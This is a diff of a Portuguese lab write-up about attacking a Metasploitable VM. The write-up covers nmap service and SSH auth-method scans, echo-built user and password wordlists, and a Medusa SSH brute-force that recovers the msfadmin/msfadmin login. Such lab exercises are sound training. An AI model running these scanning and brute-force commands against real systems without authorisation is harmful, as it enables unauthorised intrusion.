@@ -3,7 +3,7 @@
 
 1.	**Varredura de portas e versão do serviço**
 
-`nmap -sV 192.168.200.20 <br/>`
+`nmap -sV 192.168.200.20` <br/>
 
 nmap scan report for 192.168.200.20 (192.168.200.20) <br/>
 
@@ -39,7 +39,7 @@ Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: U
 
 2.	**Varredura na porta 22 com o script “ssh-auth-methods” para identificar os tipos de autenticação que o host permite**
 
-`nmap -v -p22 --script=ssh-auth-methods -Pn 192.168.200.20 <br/>`
+`nmap -v -p22 --script=ssh-auth-methods -Pn 192.168.200.20` <br/>
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. <br/>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 06:51 -03 <br/>
@@ -79,13 +79,13 @@ Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
 
 3.	**Criar listas de usuários e senhas**
 
-`echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt <br/>`
-`echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt <br/>`
+`echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt` <br/>
+`echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt` <br/>
 
 
 4.	**Teste de usuário e senha no serviço ssh com wordlist**
 
-`medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6 <br/>`
+`medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6` <br/>
 
 2025-11-04 07:22:48 ACCOUNT FOUND: [ssh] Host: 192.168.200.20 User: msfadmin Password: msfadmin [SUCCESS] <br/>
 
